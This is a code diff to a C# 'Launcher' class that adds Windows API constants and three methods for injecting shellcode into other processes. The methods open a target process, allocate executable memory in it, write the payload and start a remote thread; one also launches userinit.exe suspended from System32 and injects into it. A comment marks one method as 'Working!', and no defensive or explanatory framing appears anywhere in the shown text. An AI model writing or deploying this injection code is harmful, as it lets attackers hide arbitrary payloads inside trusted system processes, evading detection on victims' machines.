@@ -14,6 +14,18 @@ class Launcher
     const int HIGH_PRIORITY_CLASS = 0x80;
     const int REALTIME_PRIORITY_CLASS = 0x100;
 
+    const uint MEM_COMMIT = 0x00001000;
+    const uint MEM_RESERVE = 0x00002000;
+    const UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+
+    const int PROCESS_CREATE_THREAD = 0x0002;
+    const int PROCESS_QUERY_INFORMATION = 0x0400;
+    const int PROCESS_VM_OPERATION = 0x0008;
+    const int PROCESS_VM_WRITE = 0x0020;
+    const int PROCESS_VM_READ = 0x0010;
+
+    const uint PAGE_READWRITE = 4;
+
     [DllImport("kernel32.dll")]
     static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
 
@@ -193,5 +205,69 @@ class Launcher
         WinAPI.CloseHandle(hUserTokenDup);
 
         return result; // return the result
+    }
+
+    // not sure why this doesnt work
+    public static void InjectShellcode_old(byte[] shellcode, Process proc1)
+    {
+
+        //Console.WriteLine("Getting handle to process " + proc1.MainModule.FileName);
+        IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, (uint)proc1.Id);
+        Console.WriteLine("Got handle " + procHandle);
+
+        //Console.WriteLine("Allocating memory in " + proc1.MainModule.FileName);
+        IntPtr memAddr = WinAPI.VirtualAllocEx(procHandle, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        Console.WriteLine("Done.");
+
+        //Console.WriteLine("Writing to process memory");
+        UIntPtr bytesWritten;
+        bool resp1 = WinAPI.WriteProcessMemory(procHandle, memAddr, shellcode, (uint)shellcode.Length, out bytesWritten);
+        //Console.WriteLine("Done.");
+
+        //Console.WriteLine("Calling CreateRemoteThread");
+
+        IntPtr threadHandle = IntPtr.Zero;
+        WinAPI.CreateRemoteThread(procHandle, IntPtr.Zero, 0, memAddr, IntPtr.Zero, 0, IntPtr.Zero);
+
+    }
+
+    // Working!
+    public static void InjectShellcode(byte[] shellcode, Process proc)
+    {
+
+        IntPtr procHandle = WinAPI.OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, proc.Id);
+        Int32 size = shellcode.Length;        
+        IntPtr spaceAddr = WinAPI.VirtualAllocEx(procHandle, new IntPtr(0), (uint)size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+        UIntPtr bytesWritten;
+        IntPtr size2 = new IntPtr(shellcode.Length);
+        bool bWrite = WinAPI.WriteProcessMemory(procHandle, spaceAddr, shellcode, (uint)size2, out bytesWritten);
+        WinAPI.CreateRemoteThread(procHandle, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
+    }
+
+    public static void StartAndInject(byte[] shellcode)
+    {
+        string binary = "userinit.exe";
+
+        Int32 size = shellcode.Length;
+        Structs.StartupInfo sInfo = new Structs.StartupInfo();
+        
+
+        sInfo.dwFlags = 0;
+        Structs.ProcessInformation pInfo;
+        
+        string binaryPath = "C:\\Windows\\System32\\" + binary;
+
+        IntPtr funcAddr = WinAPI.CreateProcessA(binaryPath, null, null, null, true, Structs.CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, null, sInfo, out pInfo);
+        IntPtr hProcess = pInfo.hProcess;
+
+
+        IntPtr spaceAddr = WinAPI.VirtualAllocEx(hProcess, new IntPtr(0), (uint)size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+        UIntPtr bytesWritten;
+        IntPtr size2 = new IntPtr(shellcode.Length);
+        bool bWrite = WinAPI.WriteProcessMemory(hProcess, spaceAddr, shellcode, (uint)size2, out bytesWritten);
+        WinAPI.CreateRemoteThread(hProcess, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
+
     }
 }
